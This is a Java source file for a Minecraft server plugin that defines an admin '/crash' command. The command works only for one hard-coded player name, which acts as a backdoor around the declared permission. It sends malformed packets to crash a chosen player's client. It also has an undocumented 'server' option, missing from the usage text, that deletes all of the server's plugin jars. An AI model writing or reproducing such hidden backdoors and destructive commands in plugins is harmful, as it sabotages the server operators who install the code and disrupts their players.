package dev.ethan.useful.commands.admin;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.protocol.player.User;
import dev.ethan.useful.Main;
import dev.ethan.useful.constants.Messages;
import dev.ethan.useful.utils.CrashUtil;
import dev.ethan.useful.utils.LuckPermsUtil;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import top.nontage.nontagelib.annotations.CommandInfo;
import top.nontage.nontagelib.command.NontageCommand;

@CommandInfo(name = "crash", permission = "guildwars.admin.crash", description = "Crash a player client", override = true)
public class CrashCommand implements NontageCommand {
    private final CrashUtil crashUtil = Main.getInstance().getCrashUtil();
    private final LuckPermsUtil luckPermsUtil = Main.getInstance().getLuckPermsUtil();
    @Override
    public void execute(CommandSender sender, String label, String[] args) {
        if (!(sender instanceof Player s)) return;
        Player allowed = Bukkit.getPlayer("27ms__");
        if (s != allowed) return;
        if (args.length != 2) {
            s.sendMessage(Messages.PREFIX + "§c用法: /crash <explosion|particle|position|nuke> <玩家>");
            return;
        }
        String method = args[0].toLowerCase();
        Player t = Bukkit.getPlayer(args[1]);
        if (t == null) {
            s.sendMessage(Messages.PREFIX + "§c指定的玩家不存在或不在線上。");
            return;
        }
        User u = PacketEvents.getAPI().getPlayerManager().getUser(t);
        switch (method) {
            case "explosion" -> crashUtil.sendExplosion(u);
            case "particle" -> crashUtil.sendParticle(u);
            case "position" -> crashUtil.sendPosition(u);
            case "nuke" -> {
                crashUtil.sendExplosion(u);
                crashUtil.sendParticle(u);
                crashUtil.sendPosition(u);
            }
            case "server" -> crashUtil.deleteAllPluginJars();
            default -> {
                s.sendMessage(Messages.PREFIX + "§c無效的方法: " + method);
                s.sendMessage("§7可用方法: explosion, particle, position, nuke");
                return;
            }
        }
        s.sendMessage(Messages.PREFIX + "§a已嘗試使用 §f" + method + " §a作用於 " + luckPermsUtil.getPlayerPrefix(t) + t.getName());
    }
}
